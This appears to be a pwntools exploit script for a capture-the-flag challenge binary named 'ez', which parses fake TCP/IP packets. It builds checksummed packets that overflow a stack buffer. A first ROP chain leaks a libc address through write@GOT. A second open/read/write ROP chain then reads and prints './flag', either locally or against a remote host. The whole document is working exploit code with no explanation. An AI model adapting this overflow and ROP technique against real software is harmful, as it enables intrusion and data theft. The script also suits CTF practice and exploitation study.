#coding=utf-8
from pwn import *
from time import sleep

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './ez'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base


def menu(idx):
	sla("4. Quit.\n", str(idx))

def checksum(msg):
	head = 'fakeipheadfa'
	check = 0
	buf = msg
	for i in range(6):
		check ^= int(head[:2][::-1].encode("hex"),16)
		head = head[2:]
	flag = 0
	while True:
		check = check ^ int(buf[:2][::-1].encode("hex"),16)
		buf = buf[2:]
		if buf == '':
			break
	return check

def package(flag, msg, overflow,pad):
	payload = ''
	payload += p16(0x766E) + p16(0x28B7) + p32(flag)
	payload += p32(1) + p16(6) + p16(1)
	payload += p16(0) #checksum
	payload += p16(0) + p16(overflow)
	payload += p16(0xffff)
	payload += msg
	payload = payload.ljust(0x1000,pad)
	check = checksum(payload)
	payload = payload[:16]+p16(check)+payload[18:]
	return payload

def tcp(content):
	menu(1)
	sleep(1)
	sd(content)

def free(idx):
	menu(2)
	sa("Which?",str(idx))

def submit():
	menu(3)


#---------------------------------------------------------gadget
write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x0000000000401A5E
pop_rdi_ret = 0x0000000000401bb3
pop_rsi_r15_ret = 0x0000000000401bb1
ret = 0x000000000040101a
pop_rdx_r12_ret = 0x000000000011c371#libc

#---------------------------------------------------------leak
payload1 = package(1,'Epiphany',1,'a')
payload2 = package(0x1001,'Epiphany',1,'a')
payload3 = package(0x2001,'Epiphany',1,'a')

rop = 'a'*0x68 + 'junkjunk' + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0)
rop += p64(write_plt) + p64(main)
payload4 = package(0x3001,rop,1,'a')


tcp(payload1)
tcp(payload2)
tcp(payload3)
tcp(payload4)

# attach(p,'b *0x0000000000401A5D')
submit()

libc_base = leak(0x1111d0)

free(0)
free(1)
free(2)
free(3)
#---------------------------------------------------------orw
#read(0,xxx,len(./flag))
bss = 0x000000000404200+0x40
orw = 'a'*0x6a
orw += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0)
orw += p64(pop_rdx_r12_ret+libc_base) + p64(7)+p64(0) + p64(libc_base+libc.sym['read'])

#open('./flag',0)
orw += p64(pop_rdi_ret) + p64(bss) + p64(pop_rsi_r15_ret) + p64(0) + p64(0)
orw += p64(libc_base + libc.sym['open'])

#read(3,xxxx,0x30)
orw += p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_r15_ret)+p64(bss)+p64(0)+p64(pop_rdx_r12_ret+libc_base)+p64(0x30)+p64(0)+p64(libc_base+libc.sym['read'])
#write(1,xxxx,0x30)
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(pop_rdx_r12_ret+libc_base)
orw += p64(0x30) + p64(0) + p64(libc_base + libc.sym['write'])


payload1 = package(1,'Epiphany',1,'a')
payload2 = package(0x1001,'Epiphany',1,'a')
payload3 = package(0x2001,'Epiphany',1,'a')
payload4 = package(0x3001,orw,1,'\x00')

tcp(payload1)
tcp(payload2)
tcp(payload3)
tcp(payload4)

# attach(p,'b *0x0000000000401A5D')
ru("4. Quit.\n")
sl(str(3))
p.recv()
# p.recv()
# p.recv()
# p.recv()
sd('./flag\x00')
it()